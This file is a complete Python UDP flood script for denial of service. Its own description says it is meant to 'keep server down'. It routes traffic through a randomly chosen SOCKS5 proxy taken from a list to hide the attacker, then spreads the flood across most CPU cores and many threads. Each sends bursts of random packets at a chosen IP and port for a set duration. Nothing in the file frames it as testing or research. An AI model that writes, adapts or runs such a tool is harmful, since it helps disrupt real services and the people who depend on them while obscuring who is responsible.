import socket
import multiprocessing
import threading
import time
import argparse
import os
import random
import socks

PROXY_FILE = "proxies.txt"

def load_proxies():
    """Load proxies from the proxy file."""
    proxies = []
    with open(PROXY_FILE, 'r') as f:
        for line in f:
            proxies.append(line.strip())
    return proxies

def select_random_proxy(proxies):
    """Select a random proxy from the list of proxies."""
    return random.choice(proxies)

def setup_proxy(proxy):
    """Setup the SOCKS5 proxy based on the proxy details."""
    proxy_parts = proxy.split(":")
    proxy_host = proxy_parts[0]
    proxy_port = int(proxy_parts[1])
    proxy_user = proxy_parts[2]
    proxy_pass = proxy_parts[3]

    # Configure the SOCKS5 proxy
    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port, True, proxy_user, proxy_pass)
    socket.socket = socks.socksocket

def generate_random_payload():
    return os.urandom(20)

def send_packets(target_ip, target_port, end_time):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            payload = generate_random_payload()
            for _ in range(200):
                client.sendto(payload, (target_ip, target_port))
        except socket.error:
            break
    client.close()

def flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    threads = []
    for _ in range(8):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, end_time))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def udp_flood(target_ip, target_port, duration):
    num_cores = multiprocessing.cpu_count()
    num_processes = int(num_cores * 0.9)
    processes = []
    for _ in range(num_processes):
        process = multiprocessing.Process(target=flood, args=(target_ip, target_port, duration))
        process.start()
        processes.append(process)
    for process in processes:
        process.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="High-intensity UDP flood script to keep server down.")
    parser.add_argument('target_ip', help="Target IP address.")
    parser.add_argument('target_port', type=int, help="Target port number.")
    parser.add_argument('duration', type=int, help="Duration of the flood in seconds.")

    args = parser.parse_args()

    # Load proxies and select one randomly
    proxies = load_proxies()
    random_proxy = select_random_proxy(proxies)

    print(f"Using random proxy: {random_proxy}")
    setup_proxy(random_proxy)

    print(f"Starting UDP flood on {args.target_ip}:{args.target_port} for {args.duration} seconds with 90% CPU usage.")
    udp_flood(args.target_ip, args.target_port, args.duration)
    print("UDP flood completed.")
  
